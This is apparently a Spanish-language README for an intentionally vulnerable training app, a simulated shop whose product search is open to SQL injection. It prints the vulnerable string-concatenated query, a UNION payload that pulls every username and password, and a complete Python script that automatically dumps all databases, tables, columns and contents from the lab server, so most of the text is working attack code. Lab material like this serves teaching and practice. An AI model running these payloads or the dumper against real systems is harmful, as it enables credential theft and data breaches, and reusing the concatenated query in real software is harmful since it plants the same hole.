## 🚨 SQL Injection (SQLi-Lab)
- Aplicación que simula una tienda de productos.
- Presenta una vulnerabilidad a inyección SQL en la búsqueda de productos.

Este fallo de seguridad es muy crítico y permite que un atacante pueda extraer información de la base de datos en uso.

Esta es la parte crítica del código:

```python
query = "SELECT id, nombre, precio FROM productos WHERE nombre LIKE '%" + name + "%'"
```

Si cerramos la comilla, colamos otra query y comentamos el resto podemos ver información adicional que antes no podíamos ver. Prueba un payload como en la barra de búsqueda de productos:
```sh
' union select user(),(select group_concat(username,':', password) from users),3 -- -
```

Esto mostraría cada uno de los usuarios de la base de datos junto con sus contraseñas. Dependiendo de la información que queramos obtener, cambiaremos el payload a nuestro gusto.

Sin embargo, para no hacerlo todo de forma manual, he desarrollado este script que permite enumerar toda la base de datos de forma automática:

```python
import requests, signal, sys, time
from termcolor import colored


def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo ....!!!\n\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://192.168.1.60:5000/buscar"

# Extrae todas las bases de datos
def dump_databases():
    params = {
        "nombre": "' union select 1,2, group_concat(schema_name) from information_schema.schemata -- -"
    }

    r = requests.get(url, params=params)
    data = r.json()
    data = data["productos"][-1][2]

    databases = data.split(',')
    return databases

# Extrae todas las tablas de una base de datos
def dump_tables(database):
    params = {
        "nombre": f"' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema='{database}' -- -"
    }

    r = requests.get(url, params=params)
    data = r.json()
    data = data["productos"][-1][2]

    tables = data.split(',')
    return tables

# Extrae todas las columnas de una tabla
def dump_columns(database,table):
    params = {
        "nombre": f"' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema='{database}' and table_name='{table}' -- -"
    }

    r = requests.get(url, params=params)
    data = r.json()
    data = data["productos"][-1][2]

    columnas = data.split(',')
    return columnas

# Extrae el contenido de una tabla
def dump_data(database, table, columns):
    target = ", ':', ".join(columns)
    params = {
        "nombre": f"' union select 1,2, group_concat({target}) from {database}.{table} -- -"
    }

    r = requests.get(url, params=params)
    data = r.json()
    data = data["productos"][-1][2]

    content = data.split(',')
    return content


if __name__ == '__main__':
    databases = dump_databases()
    print(colored(f"\n[*] Bases de datos extraidas: {databases}\n", 'green'))
    database = 'tienda'
    print(colored(f"\n[i] Enumerando la base de datos '{database}':\n", 'red'))
    tables = dump_tables(database)
    print(colored(f"\n[*] Tablas extraidas: {tables}\n", 'yellow'))
    for table in tables:
        print("-------------------------------------------------------------------------------------------------------------------------------------------")
        print(colored(f"\n[i] Enumerando la tabla '{table}':\n", 'red'))
        columns = dump_columns(database, table)
        print(colored(f"\n[*] Columnas extraidas : {columns}\n", 'magenta'))
        content = dump_data(database, table, columns)
        print(colored(f"\n[*] Contenido extraido : {content}\n", 'blue'))
```